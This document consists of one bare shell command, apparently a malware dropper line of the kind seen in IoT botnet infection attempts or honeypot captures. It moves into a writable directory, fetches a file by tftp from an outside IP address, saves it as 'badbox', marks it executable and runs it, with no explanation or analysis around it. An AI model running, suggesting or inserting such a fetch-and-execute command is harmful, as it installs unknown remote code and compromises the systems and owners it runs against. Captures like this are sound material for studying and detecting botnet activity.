cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 109.236.88.125 -c get wget;cat wget >badbox;chmod +x *;./badbox
